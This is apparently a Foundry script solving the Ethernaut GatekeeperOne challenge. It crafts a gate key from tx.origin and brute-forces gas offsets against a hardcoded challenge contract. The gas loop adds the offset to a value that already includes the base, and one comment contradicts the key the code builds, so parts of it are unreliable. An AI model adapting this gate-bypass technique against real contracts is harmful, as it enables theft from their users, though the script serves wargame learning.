// SDPX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external;
    function entrant() external returns (address);
}

contract GatekeeperOneAttack {
    uint256 private constant GAS_TO_SEND = 49402;
    uint256 private constant TARGET_GAS_LEFT = 8191;

    function attack() public {
        IGatekeeperOne victim = IGatekeeperOne(0xbc54EDE06C72a963b6ad27fb057EF4bE476ab97c);

        // part three: we're going to use a key in the format 1100[last two bytes of tx.origin]
        bytes8 gateKey = bytes8(uint64((uint64(0x1234) << (4*8)) + uint16(uint160(tx.origin))));
        
        console.log("Entering");
        console.log(tx.origin);

        uint256 margin = 256;

        // victim.enter{gas: GAS_TO_SEND}(gateKey);
        for (uint256 i = GAS_TO_SEND - margin; i <= GAS_TO_SEND + margin; i++) {
            try victim.enter{gas: GAS_TO_SEND + i}(gateKey) {
                console.log("entry succeeded");
                console.log(i);
                console.log(victim.entrant());
                return;
            } catch Error(string memory reason) {
                if (keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part one") ||
                    keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part two") ||
                    keccak256(bytes(reason)) == keccak256("GatekeeperOne: invalid gateThree part three")) {
                    console.log("gateThree failed, but gateTwo passed at offset");
                    console.log(i);
                    return;
                }
            } catch (bytes memory lowLevelData) {
                if (i % 500 == 0) {  // Log every 500 iterations
                    console.log("Low-level revert at offset");
                }
            }
        }
    }
}


contract GatekeeperOneAttacker is Script {

    function run() public {
        console.log("Deploying GatekeeperOneAttack contract...");
        
        vm.startBroadcast(0xCDc986e956f889b6046F500657625E523f06D5F0);
        GatekeeperOneAttack attackContract = new GatekeeperOneAttack();
        attackContract.attack();
        vm.stopBroadcast();
    }
}